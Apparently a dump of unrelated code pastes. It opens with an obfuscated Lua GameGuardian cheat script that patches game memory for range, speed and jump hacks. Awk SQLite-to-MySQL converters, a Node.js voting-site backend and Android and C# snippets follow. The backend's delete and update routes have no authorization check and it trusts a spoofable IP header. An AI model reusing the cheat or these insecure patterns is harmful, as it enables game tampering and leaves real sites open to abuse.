,v7(""\216\241\169\146\36\200\240\185\130\32\217"",""\20\232\193\137\162""));v12(v7(""\46\214\199\179\233\133\3\104\108\204\202"",""\17\66\191\165\198\135\236\119""),66581886 -50275850 ,v7(""\95\255\238\67\175\168\189\129\79\251\255"",""\177\111\207\206\115\159\136\140""));v96=1767 -(459 + 1307) ;end if (1==v96) then v12(v7(""\9\128\18\1\218\70\75\28\199\3\27"",""\63\101\233\112\116\180\47""),16307902 -(474 + 1396) ,v7(""\147\107\173\66\168\118\146\107\173\70\169"",""\86\163\91\141\114\152""));v12(v7(""\95\2\118\102\52\90\31\109\61\41\92"",""\90\51\107\20\19""),16306028,v7(""\221\160\197\191\109\205\161\213\175\105\220"",""\93\237\144\229\143""));v96=2;end if (v96==(2 -0)) then gg.toast(""Long Range x9 Activated☑️"");break;end end end if (N==(8 + 0)) then local v97=0;local v98;while true do if (0==v97) then v98=0 + 0 ;while true do if (v98==(2 -1)) then v12(v7(""\18\185\4\29\22\225\10\169\72\27\23"",""\136\126\208\102\104\120""),2066090 + 14239942 ,v7(""\40\218\142\19\255\18\111\1\56\222\159"",""\49\24\234\174\35\207\50\93""));v12(v7(""\0\251\255\157\127\5\230\228\198\98\3"",""\17\108\146\157\232""),54434318 -38128290 ,v7(""\27\147\84\189\127\232\25\147\84\185\126"",""\200\43\163\116\141\79""));v98=8 -6 ;end if (v98==(591 -(562 + 29))) then local v117=0 + 0 ;while true do if (v117==(1420 -(374 + 1045))) then v98=1 + 0 ;break;end if (v117==0) then v12(v7(""\25\255\242\12\5\79\1\239\190\10\4"",""\38\117\150\144\121\107""),50633950 -34327910 ,v7(""\125\235\174\106\125\251\188\106\109\239\191"",""\90\77\219\142""));v12(v7(""\234\13\35\44\66\14\110\255\74\50\54"",""\26\134\100\65\89\44\103""),16306674 -(448 + 190) ,v7(""\161\179\112\115\244\177\177\96\99\240\160"",""\196\145\131\80\67""));v117=1 + 0 ;end end end if (v98==2) then gg.toast(""Long Range x10 Activated☑️"");break;end end break;end end end if (N==9) then local v99=0 + 0 ;local v100;while true do if ((0 + 0)==v99) then v100=0 -0 ;while true do if (v100==0) then v12(v7(""\179\63\63\150\190\253\247\166\120\46\140"",""\131\223\86\93\227\208\148""),50667858 -34361818 ,v7(""\179\21\246\230\77\245\182\21\246\226\76"",""\213\131\37\214\214\125""));v12(v7(""\42\34\39\170\239\47\63\60\241\242\41"",""\129\70\75\69\223""),16307530 -(1307 + 187) ,v7(""\22\155\179\185\44\175\19\155\179\189\45"",""\143\38\171\147\137\28""));v100=1;end if (v100==(3 -2)) then v12(v7(""\220\139\187\230\13\234\192\201\204\170\252"",""\180\176\226\217\147\99\131""),38179296 -21873264 ,v7(""\131\233\111\87\131\249\122\87\147\237\126"",""\103\179\217\79""));v12(v7(""\70\190\30\192\79\133\183\83\249\15\218"",""\195\42\215\124\181\33\236""),49997965 -33691937 ,v7(""\93\9\119\110\117\184\88\9\119\106\116"",""\152\109\57\87\94\69""));v100=2;end if (v100==(685 -(232 + 451))) then gg.toast(""Long Range x13 Activated☑️"");break;end end break;end end end v66=3;end if (v66==(3 + 0)) then local v88=0 + 0 ;while true do if (v88==1) then if (N==(576 -(510 + 54))) then local v109=0 -0 ;local v110;while true do if (v109==(36 -(13 + 23))) then v110=0 -0 ;while true do if ((1 -0)==v110) then v12(v7(""\166\184\239\242\121\231\83\179\255\254\232"",""\39\202\209\141\135\23\142""),16306032,v7(""\175\99\73\90\98\184\220\107\73\94\99"",""\152\159\83\105\106\82""));v12(v7(""\141\207\83\231\199\85\149\223\31\225\198"",""\60\225\166\49\146\169""),29626477 -13320449 ,v7(""\127\78\111\122\81\71\12\70\111\126\80"",""\103\79\126\79\74\97""));v110=1090 -(830 + 258) ;end if (v110==(6 -4)) then gg.toast(""Long Range x25 Activated☑️"");break;end if ((0 + 0)==v110) then local v122=0 + 0 ;while true do if (v122==0) then local v125=1441 -(860 + 581) ;while true do if (v125==1) then v122=3 -2 ;break;end if (v125==(0 + 0)) then v12(v7(""\18\233\119\223\228\130\13\207\80\243\122"",""\182\126\128\21\170\138\235\121""),16306281 -(237 + 4) ,v7(""\219\138\117\182\214\83\19\94\203\142\100"",""\102\235\186\85\134\230\115\80""));v12(v7(""\91\5\60\74\124\221\54\78\66\45\80"",""\66\55\108\94\63\18\180""),38322952 -22016916 ,v7(""\68\221\197\103\119\25\55\213\197\99\118"",""\57\116\237\229\87\71""));v125=2 -1 ;end end end if (v122==(1 -0)) then v110=1;break;end end end end break;end end end v66=4 + 0 ;break;end if (v88==(0 + 0)) then if (N==10) then local v111=0 -0 ;while true do if (v111==1) then v12(v7(""\253\44\79\250\215\248\49\84\161\202\254"",""\185\145\69\45\143""),6996869 + 9309163 ,v7(""\218\79\89\246\140\202\71\73\230\136\219"",""\188\234\127\121\198""));v12(v7(""\52\59\17\150\54\59\7\154\118\33\28"",""\227\88\82\115""),8869535 + 7436493 ,v7(""\19\79\250\247\82\51\27\79\250\243\83"",""\19\35\127\218\199\98""));v111=1428 -(85 + 1341) ;end if (v111==(0 -0)) then v12(v7(""\245\222\8\182\176\219\64\177\183\196\5"",""\200\153\183\106\195\222\178\52""),16306040,v7(""\98\179\200\109\25\26\106\179\200\105\24"",""\58\82\131\232\93\41""));v12(v7(""\143\94\210\0\83\54\151\78\158\6\82"",""\95\227\55\176\117\61""),16306036,v7(""\72\46\99\27\251\88\38\115\11\255\73"",""\203\120\30\67\43""));v111=2 -1 ;end if (v111==(374 -(45 + 327))) then gg.toast(""Long Range x16 Activated☑️"");break;end end end if (N==(20 -9)) then local v112=502 -(444 + 58) ;local v113;while true do if (v112==0) then v113=0 + 0 ;while true do if (v113==(0 + 0)) then v12(v7(""\16\242\8\247\18\242\30\251\82\232\5"",""\130\124\155\106""),7971583 + 8334457 ,v7(""\133\155\182\255\243\182\93\239\149\159\167"",""\223\181\171\150\207\195\150\28""));v12(v7(""\64\51\225\187\7\69\46\250\224\26\67"",""\105\44\90\131\206""),47254771 -30948739 ,v7(""\175\176\242\233\88\126\222\176\242\237\89"",""\94\159\128\210\217\104""));v113=1733 -(64 + 1668) ;end if ((1975 -(1227 + 746))==v113) then gg.toast(""Long Range x20 Activated☑️"");break;end if (v113==(2 -1)) then v12(v7(""\92\240\4\170\81\118\237\99\30\234\9"",""\26\48\153\102\223\63\31\153""),30262332 -13956296 ,v7(""\82\16\173\163\82\0\204\163\66\20\188"",""\147\98\32\141""));v12(v7(""\20\74\225\223\8\95\95\1\13\240\197"",""\43\120\35\131\170\102\54""),16306522 -(415 + 79) ,v7(""\4\86\199\230\245\240\165\4\70\211\231"",""\228\52\102\231\214\197\208""));v113=2;end end break;end end end v88=1;end end end if (v66==(1 + 3)) then local v89=491 -(142 + 349) ;while true do if ((1 + 0)==v89) then if (N==(20 -5)) then v12(v7(""\180\177\30\41\182\177\8\37\246\171\19"",""\92\216\216\124""),8103281 + 8202751 ,v7(""\11\98\236\16\173\27\98\254\0\169\8"",""\157\59\82\204\32""));v12(v7(""\52\55\225\239\231\227\199\168\118\45\236"",""\209\88\94\131\154\137\138\179""),16306040,v7(""\120\241\132\44\78\99\97\112\104\245\151"",""\66\72\193\164\28\126\67\81""));v12(v7(""\235\37\170\77\40\127\243\53\230\75\41"",""\22\135\76\200\56\70""),16306036,v7(""\221\96\184\116\13\161\221\98\184\112\14"",""\129\237\80\152\68\61""));v12(v7(""\93\161\6\230\18\30\76\72\230\23\252"",""\56\49\200\100\147\124\119""),11488361 + 4817667 ,v7(""\156\110\255\160\156\126\239\162\140\106\236"",""\144\172\94\223""));gg.toast(""Long Range x130 Activated☑️"");end v66=5;break;end if (v89==(0 -0)) then if (N==(1877 -(1710 + 154))) then v12(v7(""\182\118\209\102\80\19\174\102\157\96\81"",""\122\218\31\179\19\62""),16306346 -(200 + 118) ,v7(""\227\134\141\145\153\225\99\227\150\153\144"",""\37\211\182\173\161\169\193""));v12(v7(""\251\51\79\204\38\114\173\238\116\94\214"",""\217\151\90\45\185\72\27""),6461054 + 9844978 ,v7(""\147\44\167\66\6\131\90\183\82\2\146"",""\54\163\28\135\114""));v12(v7(""\36\210\95\151\64\118\60\194\19\145\65"",""\31\72\187\61\226\46""),28510067 -12204031 ,v7(""\147\86\3\130\23\62\2\147\70\23\131"",""\68\163\102\35\178\39\30""));v12(v7(""\178\121\216\210\13\188\151\8\240\99\213"",""\113\222\16\186\167\99\213\227""),24185514 -7879474 ,v7(""\126\94\187\166\126\78\221\166\110\90\170"",""\150\78\110\155""));gg.toast(""Long Range x30 Activated☑️"");end if (N==(13 + 1)) then local v114=0 + 0 ;local v115;while true do if (v114==0) then v115=0 + 0 ;while true do if (v115==(1 + 1)) then gg.toast(""Long Range x45 Activated☑️"");break;end if (v115==(0 -0)) then v12(v7(""\137\204\37\244\170\23\171\89\203\214\40"",""\32\229\165\71\129\196\126\223""),16307290 -(363 + 887) ,v7(""\147\217\132\209\209\149\144\221\132\213\211"",""\181\163\233\164\225\225""));v12(v7(""\92\130\60\98\94\130\42\110\30\152\49"",""\23\48\235\94""),28473757 -12167725 ,v7(""\44\138\152\13\7\115\129\40\154\140\15"",""\178\28\186\184\61\55\83""));v115=4 -3 ;end if (v115==(1 + 0)) then local v123=0 -0 ;while true do if (v123==(1 + 0)) then v115=1666 -(674 + 990) ;break;end if (v123==0) then v12(v7(""\200\196\69\41\252\7\225\221\131\84\51"",""\149\164\173\39\92\146\110""),16306036,v7(""\163\119\80\79\74\91\160\115\80\75\72"",""\123\147\71\112\127\122""));v12(v7(""\192\196\128\100\72\197\217\155\63\85\195"",""\38\172\173\226\17""),4674964 + 11631064 ,v7(""\29\65\108\191\29\81\127\187\13\69\126"",""\143\45\113\76""));v123=1 + 0 ;end end end end break;end end end v89=1 -0 ;end end end end break;end end end break;end if ((1055 -(507 + 548))==v31) then gg.alert(v7(""\250\171\85\88\4\250\71\204\163\84\88\4\232\71\158\144\78\94\74\156\103\216\162\27\96\75\210\79\158\150\90\66\67\217\8\201\172\94\66\4\209\73\202\167\83\12\66\213\70\215\183\83\73\87"",""\40\190\196\59\44\36\188""));N=gg.choice({v7(""\16\74\210\179\186\79\12\50\66\217\244\226\46"",""\109\92\37\188\212\154\29""),v7(""\40\224\170\196\113\104\5\225\163\198\113\66\80"",""\58\100\143\196\163\81""),v7(""\54\77\45\164\127\123\228\0\29\71\99\187\106"",""\110\122\34\67\195\95\41\133""),v7(""\89\190\85\77\150\71\176\85\77\211\53\169\13"",""\182\21\209\59\42""),v7(""\155\88\203\26\97\140\182\89\194\24\97\166\224"",""\222\215\55\165\125\65""),v7(""\0\222\200\29\178\243\236\68\43\212\134\2\170"",""\42\76\177\166\122\146\161\141""),v7(""\137\133\11\201\57\68\164\132\2\203\57\110\252"",""\22\197\234\101\174\25""),v7(""\1\59\171\219\54\157\214\136\42\49\229\196\39\255"",""\230\77\84\197\188\22\207\183""),v7(""\213\27\200\251\204\147\241\59\254\17\134\228\221\242"",""\85\153\116\166\156\236\193\144""),v7(""\136\239\67\180\164\50\165\238\74\182\164\24\245\182"",""\96\196\128\45\211\132""),v7(""\25\130\117\88\146\157\181\214\50\136\59\71\128\255"",""\184\85\237\27\63\178\207\212""),v7(""\36\86\7\88\72\107\8\81\15\92\73\71\90\12"",""\63\104\57\105""),v7(""\39\136\170\67\75\181\165\74\12\130\228\92\88\215"",""\36\107\231\196""),v7(""\113\186\172\128\29\135\163\137\90\176\226\159\9\224"",""\231\61\213\194""),v7(""\37\162\51\116\73\159\60\125\14\168\125\107\88\254\109"",""\19\105\205\93""),v7(""\156\6\210\136\50\160\28\219\133\127\133\7\208\134\127\155\9\208\134\58"",""\95\201\104\190\225"")},nil,v7(""\140\195\206\193\188\206\129\226\160\197\198\142\157\202\207\201\170\139\239\219\162\201\196\220"",""\174\207\171\161""));v31=1;end end break;end end end function OFF()local v32=0 -0 ;while true do if ((6 -4)==v32) then gg.toast(""Long Range Deactivated (OFF)❎"");break;end if (0==v32) then v12(v7(""\27\21\205\75\198\208\174\14\82\220\81"",""\218\119\124\175\62\168\185""),12008138 + 4297902 ,v7(""\245\160\8\148\245\176\16\148\229\163\110"",""\164\197\144\40""));v12(v7(""\143\249\168\158\211\191\151\233\228\152\210"",""\214\227\144\202\235\189""),8538527 + 7767505 ,v7(""\189\245\199\43\64\243\11\108\173\246\161"",""\92\141\197\231\27\112\211\51""));v32=618 -(14 + 603) ;end if (v32==(130 -(118 + 11))) then v12(v7(""\234\246\136\182\223\239\235\147\237\194\233"",""\177\134\159\234\195""),16306036,v7(""\237\187\127\240\153\253\179\111\224\154\155"",""\169\221\139\95\192""));v12(v7(""\210\130\125\42\44\47\202\146\49\44\45"",""\70\190\235\31\95\66""),16306028,v7(""\234\178\90\182\181\250\186\74\166\182\156"",""\133\218\130\122\134""));v32=2;end end end function SPEED()if (AI==off) then local v34=0 + 0 ;while true do if (v34==2) then gg.setVisible(false);gg.clearResults();v34=3;end if (v34==(4 + 0)) then AI=on;break;end if (v34==(8 -5)) then gg.clearList();gg.toast(""Speed hack ON☑️"");v34=953 -(551 + 398) ;end if (0==v34) then gg.clearResults();gg.clearList();v34=1 + 0 ;end if (v34==(1 + 0)) then local v43=0;while true do if (v43==1) then v34=2 + 0 ;break;end if (v43==(0 -0)) then local v67=0 -0 ;while true do if (v67==(1 + 0)) then v43=1;break;end if (v67==(0 -0)) then gg.setVisible(false);v12(v7(""\48\246\225\205\208\241\59\44\239\173\215\211"",""\88\92\159\131\164\188\195""),5753626 + 15086030 ,v7(""\163\126\255\27\132\171\136\166\110\155\29"",""\189\224\78\223\43\183\139""));v67=90 -(40 + 49) ;end end end end end end else local v35=0;local v36;local v37;while true do if ((0 -0)==v35) then v36=490 -(99 + 391) ;v37=nil;v35=1 + 0 ;end if (1==v35) then while true do if (v36==0) then v37=0;while true do if ((8 -6)==v37) then local v80=0 -0 ;while true do if (v80==(0 + 0)) then gg.setVisible(false);gg.clearResults();v80=1;end if (v80==1) then v37=7 -4 ;break;end end end if (v37==(1605 -(1032 + 572))) then local v81=417 -(203 + 214) ;while true do if (v81==(1818 -(568 + 1249))) then v37=2 + 0 ;break;end if (v81==(0 -0)) then gg.setVisible(false);v12(v7(""\34\245\136\31\205\124\255\154\6\143\61\243"",""\161\78\156\234\118""),80494473 -59654817 ,v7(""\130\239\137\140\129\247\152\249\231\145\234"",""\188\199\215\169""));v81=1307 -(913 + 393) ;end end end if (v37==(11 -7)) then AI=off;break;end if ((3 -0)==v37) then local v82=410 -(269 + 141) ;while true do if (v82==(2 -1)) then v37=1985 -(362 + 1619) ;break;end if (v82==0) then gg.clearList();gg.toast(""Speed hack OFF☑️"");v82=1;end end end if (v37==(1625 -(950 + 675))) then local v83=0 + 0 ;while true do if (v83==(1180 -(216 + 963))) then v37=1;break;end if (v83==(1287 -(485 + 802))) then gg.clearResults();gg.clearList();v83=560 -(432 + 127) ;end end end end break;end end break;end end end end function JUMP()if (NIGA==off) then local v38=1073 -(1065 + 8) ;while true do if (v38==1) then NIGA=on;break;end if (v38==(0 + 0)) then v12(v7(""\240\0\93\114\228\174\10\79\107\166\239\6"",""\136\156\105\63\27""),20864841 -(635 + 966) ,v7(""\56\220\57\100\72\204\44\18\91\168\47"",""\84\123\236\25""));gg.toast(""Disabled Jump ON☑️"");v38=1;end end else local v39=0;while true do if (v39==(1 + 0)) then NIGA=off;break;end if (v39==(42 -(5 + 37))) then v12(v7(""\252\130\168\30\160\231\243\155\186\89\191\186"",""\213\144\235\202\119\204""),51889160 -31025920 ,v7(""\5\62\158\9\123\99\29\114\88\250\123"",""\45\67\120\190\74\72\67""));gg.toast(""returned jumping feature❎"");v39=1;end end end end while true do if gg.isVisible(true) then AGYT=1;gg.setVisible(false);end if (AGYT==(1 + 0)) then START();end end"
uV6teSaW,convert_sqlite_to_mysql.awk,kevin2458,Bash,Wednesday 7th of February 2024 12:15:19 PM CDT,"# Process lines starting with ""CREATE TABLE"" or ""INSERT INTO""
/^CREATE TABLE|^INSERT INTO/ {
    # Add backticks to table names and column names to handle reserved words and special characters
    gsub(/""([^""]+)""/, ""`\\1`"", $0);

    # For CREATE TABLE statements, convert some common SQLite data types to MySQL equivalents
    if ($0 ~ /^CREATE TABLE/) {
        gsub(/INTEGER PRIMARY KEY AUTOINCREMENT/, ""INT AUTO_INCREMENT PRIMARY KEY"", $0);
        gsub(/AUTOINCREMENT/, ""AUTO_INCREMENT"", $0);
        gsub(/VARCHAR\([0-9]+\)/, ""VARCHAR(255)"", $0); # Example conversion, adjust as needed
        # Add other data type conversions here as needed
    }
}

# Remove SQLite-specific commands and lines not needed in MySQL
/PRAGMA|BEGIN TRANSACTION|COMMIT|sqlite_sequence|CREATE UNIQUE INDEX/ {
    next; # Skip this line
}

{
    # Print all other lines by default
    print;
}"
84Z47GdF,db-config.js,Grossos,JavaScript,Wednesday 7th of February 2024 12:12:03 PM CDT,"const sql = require('mysql2');
const connection = sql.createPool({
    connectionLimit: 10,
    host: process.env.DATABASE_HOST,
    user: process.env.DATABASE_USER,
    password: process.env.DATABASE_PASSWORD,
    database: process.env.DATABASE
    // port: process.env.PORT
});

// const util = require('util');
// const queryUtil = util.promisify(connection.query).bind(connection);

let instance = null;

class dbService {
    static getDbServiceInstance() {
        return instance ? instance : new dbService();
    }

    async getAllData() {
        try {
            const response = await new Promise((resolve, reject) => {

                const query = ""SELECT *, votes.vote_in,rank() OVER ( order by votes.vote_in DESC, servers.id ASC ) AS 'rank' FROM servers JOIN votes ON servers.id = votes.server_id""

                connection.query(query, (err, results) => {
                    if (err) reject(new Error(err.message));
                    resolve(results)
                })
            });
            return response;

        } catch (error) {
            console.log(error);
        }
    }

    async getDataByUserId(id) {

        try {
            const response = await new Promise((resolve, reject) => {
                const query = `SELECT *,votes.vote_in FROM servers JOIN votes ON servers.id = votes.server_id WHERE user_id = ?`;
                connection.query(query, [id], (err, results) => {
                    // console.log(results);
                    if (err) reject(new Error(err.message));
                    resolve(results)
                })
            });
            return response;

        } catch (error) {
            console.log(error);
        }
    }
    // id
    async getRankData() {
        try {
            const response = await new Promise((resolve, reject) => {

                const query = ""SELECT servers.id, servers.user_id, votes.vote_in, rank() OVER ( order by votes.vote_in DESC, servers.id ASC ) AS 'rank' FROM servers JOIN users ON servers.user_id = users.user_id JOIN votes ON servers.id = votes.server_id"";

                connection.query(query, (err, results) => {
                    if (err) reject(new Error(err.message));
                    resolve(results)
                })
            });
            return response;

        } catch (error) {
            console.log(error);
        }
    }

    async categoryById(id) {
        try {
            const response = await new Promise((resolve, reject) => {

                const query = `SELECT *, votes.vote_in, servers.category, rank() OVER ( order by votes.vote_in DESC, servers.id ASC ) AS 'rank' FROM servers JOIN votes ON servers.id = votes.server_id WHERE category = ?`;

                connection.query(query, [id], (err, results) => {
                    if (err) reject(new Error(err.message));
                    resolve(results)
                })
            });
            return response;

        } catch (error) {
            console.log(error);
        }
    }

    async detailsRowById(id) {
        try {
            const response = await new Promise((resolve, reject) => {

                const query = `SELECT *, votes.vote_in FROM servers JOIN votes ON servers.id = votes.server_id WHERE servers.id = ?`;

                connection.query(query, [id], (err, results) => {
                    if (err) reject(new Error(err.message));
                    resolve(results)
                })
            });
            return response;

        } catch (error) {
            console.log(error);
        }
    }

    async getSiteCount() {
        try {
            const response = await new Promise((resolve, reject) => {

                const query = `SELECT COUNT(*) FROM servers`;

                connection.query(query, (err, results) => {
                    if (err) reject(new Error(err.message));
                    resolve(results)
                })
            });
            return response;

        } catch (error) {
            console.log(error);
        }
    }

    async lastRowsById() {
        try {
            const response = await new Promise((resolve, reject) => {

                const query = ""SELECT *, votes.vote_in FROM servers JOIN votes ON servers.id = votes.server_id ORDER BY servers.user_id DESC LIMIT 3"";

                connection.query(query, (err, results) => {
                    if (err) reject(new Error(err.message));
                    resolve(results)
                })
            });
            return response;

        } catch (error) {
            console.log(error);
        }
    }

    async deleteRowById(id) {
        try {
            id = parseInt(id, 10);
            const response = await new Promise((resolve, reject) => {
                // must be improved
                const query = `DELETE FROM votes WHERE server_id = ?;`;

                connection.query(query, [id], (err, result) => {
                    if (err) reject(new Error(err.message));
                    resolve(result.affectedRows);
                    return reject;
                })
            });
            return response === 1 ? true : false;
        } catch (err) {
            console.log(error);
            return false;
        } finally {
            id = parseInt(id, 10);
            const response = await new Promise((resolve, reject) => {
                const query = `DELETE FROM servers WHERE id = ?;`;

                connection.query(query, [id], (err, result) => {
                    if (err) reject(new Error(err.message));
                    resolve(result.affectedRows);
                    return reject;
                })
            });
            return response === 1 ? true : false;
        }
    }

    async updateById(id, site_title, site_url, banner_url, desc_text, category) {
        try {
            id = parseInt(id, 10);
            // console.log(id);
            const response = await new Promise((resolve, reject) => {

                // const query = `UPDATE votes SET vote_in = ${input} WHERE server_id = ${id}`;
                const query = `UPDATE servers SET site_title = ?, site_url = ?, banner_url = ?, desc_text = ?, category = ? WHERE id = ?`;
                // must add => if category changed must reset votes

                connection.query(query, [site_title, site_url, banner_url, desc_text, category, id], (err, result) => {
                    if (err) reject(new Error(err.message));
                    // console.log(query);
                    resolve(result);
                })
            });
            return response === 1 ? true : false;
        } catch (error) {
            console.log(error);
            return false;
        }
    }


    async voteRowById(serverId, ipAddress, fingerprint, userAgent) {
        try {
            serverId = parseInt(serverId, 10);
            console.log(serverId);

            // Check if records exist in voters_info
            const checkQuery = `SELECT * FROM voters_info WHERE ip_address = ? OR fingerprint = ? `; // AND userAgent = ?
            const checkResult = await new Promise((resolve, reject) => {
                connection.query(checkQuery, [ipAddress, fingerprint, userAgent], (err, result) => {
                    if (err) reject(new Error(err.message));
                    resolve(result);
                });
            });
            // console.log(checkResult);

            if (checkResult.length > 0) {
                // If records already exist, reject the operation
                console.log(""Records already exist in voters_info"");
                return { success: false, message: ""Records already exist in voters_info"" };
            }

            // Records don't exist, proceed with the update
            const updateQuery = `UPDATE votes SET vote_in = COALESCE(vote_in, 0) + 1 WHERE server_id = ?`;
            const updateResult = await new Promise((resolve, reject) => {
                connection.query(updateQuery, [serverId], (err, result) => {
                    if (err) reject(new Error(err.message));
                    resolve(result.affectedRows);
                });
            });

            // Insert into voters_info
            const insertQuery = `INSERT INTO voters_info SET ?`;
            const insertResult = await new Promise((resolve, reject) => {
                connection.query(insertQuery, { vote_server: serverId, ip_address: ipAddress, fingerprint, userAgent, voted_date: new Date().toLocaleDateString() }, (err, result) => {
                    if (err) reject(new Error(err.message));
                    resolve(result);
                });
            });

            return { success: true, updateResult, insertResult };

        } catch (error) {
            console.log(error);
            return { success: false, message: ""An error occurred during the operation"" };
        }
    }


}

module.exports = { connection, dbService }"
Jki0dwKC,pages.js,Grossos,JavaScript,Wednesday 7th of February 2024 12:06:06 PM CDT,"const express = require('express');
const loggedIn = require('./loggedIn');
const logout = require('./logout');
const router = express.Router();
const { dbService } = require('../config/db-config');
// // Routing handlebars 
router.get('/', async (req, res) => {

    // console.log(req.user);
    // console.log(req.cookies.userRegistered);
    // console.log(process.env.JWT_SECRET);
    const dbS = dbService.getDbServiceInstance();
    const data = await dbS.getAllData();
    return res.render('index', {
        data, helpers: {
            getNumber: (vote_in) => vote_in !== null ? vote_in : 0
        }
    });
});

router.get('/login', (req, res) => {
    res.render('login');
});

router.get('/register', (req, res) => {
    res.render('register');
});

// router.get('/addserver', (req, res) => {
//     res.render('register', { isAddServer: true });
// });

router.get('/edit', async (req, res) => {
    // console.log(req.user.user_id);

    // console.log(data);
    // console.log(req.cookies.userRegistered);
    // console.log(process.env.JWT_SECRET);

    // crashes when cookies stay (database records are deleted) and typeof (req.user.user_id) == 'undefined' 
    if (typeof (req.cookies.userRegistered) == 'undefined') {

        return res.render('login');
    } else {
        const dbS = dbService.getDbServiceInstance();
        let data = await dbS.getDataByUserId(req.user.user_id);
        return res.render('edit', {
            data,
            helpers: {
                getNumber: (vote_in) => vote_in !== null ? vote_in : 0
            }
        });
    }
});


// Delete
router.delete('/delete/:id', (req, res) => {
    console.log(req.method, req.url);

    const { id } = req.params;
    // console.log(id);
    console.log(req.params);
    const dbS = dbService.getDbServiceInstance();
    const result = dbS.deleteRowById(id);

    result
        .then(data => res.json({ success: data }))
        .catch(err => console.log(err));

});

// Update
router.patch('/update', (req, res) => {
    // console.log(req.method, req.url);
    const { id, site_title, site_url, banner_url, desc_text, category } = req.body;
    // console.log(input);
    const dbS = dbService.getDbServiceInstance();
    const result = dbS.updateById(id, site_title, site_url, banner_url, desc_text, category);

    result
        .then(data => res.json({ success: data }))
        .catch(err => console.log(err));

});

router.get('/category/:id', (req, res) => {
    const { id } = req.params;

    const dbS = dbService.getDbServiceInstance();
    const result = dbS.categoryById(id);

    result
        .then(data => {

            res.render('category', {
                data, helpers: {
                    getRank: (rank) => rank !== null ? rank : 0,
                    getNumber: (vote_in) => vote_in !== null ? vote_in : 0
                }
            })
        })
        .catch(err => console.log(err))
});

let serverId = 0;

router.get('/details/:id', (req, res) => {
    const { id } = req.params;
    serverId = Number(id);
    const dbS = dbService.getDbServiceInstance();
    const result = dbS.detailsRowById(id);

    result
        .then(data => {

            res.render('details', {
                data, helpers: {
                    getNumber: (vote_in) => vote_in !== null ? vote_in : 0
                }
            })
        })
        .catch(err => console.log(err));
});

let fingerprint = '';

router.post('/fingerprint', (req, res) => {
    const result = req.body.fingerprint;
    fingerprint = result;
    res.send('Fingerprint processed on the server.');
});

// Endpoint to check vote eligibility
router.post('/checkVote', async (req, res) => {
    try {

        const { userAgent, test } = req.body;

        let ipAddress = req.headers['X-Forwarded-For'] || req.socket.remoteAddress.split(`:`).pop();
        // console.log(req.socket.remoteFamily);
            console.log(userAgent);
        // console.log(req.headers);
        // console.log(req.ip);
        // console.log(ipAddress);
        // console.log(req.socket.remoteAddress);

        // console.log(userAgent);
        // console.log(serverId);


        const dbS = dbService.getDbServiceInstance();
        const voteResult = await dbS.voteRowById(serverId, ipAddress, fingerprint, userAgent);

        if (!voteResult.success) {
            return res.json({ canVote: false, message: voteResult.message });
        }

        res.json({ canVote: true });

    } catch (error) {
        console.error('Error in /checkVote:', error);
        res.status(500).json({ canVote: false, message: ""Internal Server Error"" });
    }
});

router.get('/showrank', (req, res) => {

    const dbS = dbService.getDbServiceInstance();
    const result = dbS.getRankData();

    result
        .then(data => {
            res.json(data);
        })
        .catch(err => console.log(err))
});

router.get('/showrank/:id', (req, res) => {
    //Works only for details, not for edit!!! It needs another get for edit 
    const { id } = req.params; // servers.id

    const dbS = dbService.getDbServiceInstance();
    const result = dbS.getRankData();

    result
        .then(data => {
            for (let property in data) {

                if (data[property].id == id) {
                    const rankValue = data[property].rank;

                    res.json(rankValue);
                }
            }
        })
        .catch(err => console.log(err))
});

router.get('/contact', (req, res) => {
    res.render('contact');
});

router.get('/gold', (req, res) => {
    res.render('gold');
});

router.get('/privacy', (req, res) => {
    res.render('privacy');
});

router.get('/advertise', (req, res) => {
    res.render('advertise');
});

router.get('/last', (req, res) => {

    const dbS = dbService.getDbServiceInstance();
    const result = dbS.lastRowsById();

    result
        .then(data => {

            res.render('last', {
                data, helpers: {
                    getNumber: (vote_in) => vote_in !== null ? vote_in : 0
                }
            })
        })
        .catch(err => console.log(err));
});

router.get('/sitecount', (req, res) => {

    const dbS = dbService.getDbServiceInstance();
    const result = dbS.getSiteCount();

    result
        .then(data => {
            const countValue = data[0]['COUNT(*)'];

            res.json(countValue);
        })
        .catch(err => {
            console.log(err);
            res.status(500).json({ error: 'Internal Server Error' });
        });
});

// Routing static html

// old
// router.get('/', (req, res) => {
//     if (req.user) {
//         res.render('index', { status: ""loggedIn"", user: req.user });
//     } else {
//         res.render('index', { status: ""loggedIn"", user: req.user });
//     }
// });

module.exports = router;"
6WKQ8JNj,escape.awk,kevin2458,Bash,Wednesday 7th of February 2024 12:00:11 PM CDT,"/^INSERT INTO/ {
    # Match columns and values in the INSERT statement
    match($0, /^INSERT INTO[[:space:]]+""?([^"" (]+)""?[[:space:]]*\(([^\)]+)\)[[:space:]]*VALUES[[:space:]]*\((.+)\);$/, matches)

    # Extract table name, columns, and values
    table = matches[1]
    middle = matches[2]
    values = matches[3]

    # Remove all quotes from table name (if needed, depending on the dump format)
    gsub(/""/, """", table)

    # Prepare columns, stripping quotes and surrounding each with backticks
    gsub(/""/, """", middle) # Strip quotes from column names, if present
    n = split(middle, columns, "","") # Split column names into array

    # Initialize variables for constructing the column list with backticks
    sep = """"
    cols = """"
    for(i = 1; i <= n; i++) {
        # Surround column name with backticks
        cols = cols sep ""`"" columns[i] ""`""
        sep = "", ""
    }

    # Print the modified INSERT statement
    printf(""INSERT INTO `%s` (%s) VALUES(%s);\n"", table, cols, values)
}"
WghXPRda,Untitled,arabs-hackers,JavaScript,Wednesday 7th of February 2024 11:46:02 AM CDT,"apply plugin: 'com.android.application'

android {
    compileSdkVersion 30
    defaultConfig {
        applicationId ""com.app.main""
        minSdkVersion 16
        targetSdkVersion 29
        versionCode 1
        versionName ""1.0""
        ndk {
            abiFilters 'armeabi-v7a'
        }
        signingConfig signingConfigs.debug
    }
    buildTypes {
        release {
            shrinkResources false
            minifyEnabled false
            proguardFiles getDefaultProguardFile('proguard-android-optimize.txt'), 'proguard-rules.pro'
        }
        debug {
            shrinkResources false
            minifyEnabled false
            proguardFiles getDefaultProguardFile('proguard-android-optimize.txt'), 'proguard-rules.pro'
        }
    }
    externalNativeBuild {
        ndkBuild {
            path file('src/main/jni/Android.mk')
        }
    }
}

dependencies {
    implementation fileTree(dir: 'libs', include: ['*.jar'])
    
}
"
D8s08LfM,ConsoleMenu,SaNik74,C#,Wednesday 7th of February 2024 11:22:03 AM CDT,"class Program
{
    static void Main(string[] args)
    {
        const string CommandEnterName = ""1"";
        const string CommandEnterPassword = ""2"";
        const string CommandWriteDateAndTime = ""3"";
